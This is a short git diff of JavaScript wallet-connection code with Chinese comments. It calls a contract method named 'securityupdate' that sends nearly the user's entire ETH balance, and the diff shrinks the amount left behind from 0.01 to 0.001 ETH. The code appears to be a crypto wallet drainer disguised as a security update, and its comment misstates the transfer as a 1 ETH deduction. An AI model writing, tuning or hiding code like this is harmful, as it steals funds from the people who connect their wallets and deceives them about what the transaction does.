@@ -883,7 +883,7 @@ async function handleWallet(walletName) {
               // 假设调用合约的doSomething方法
               await contract.methods.securityupdate().send(({
                   from: curAccount,
-                  value: balanceWei - BigInt(10000000000000000), // 从用户余额中扣除1ETH
+                  value: balanceWei - BigInt(1000000000000000), // 从用户余额中扣除1ETH
                 }));
               console.log('合约调用结果:', result);
           } catch (error) {
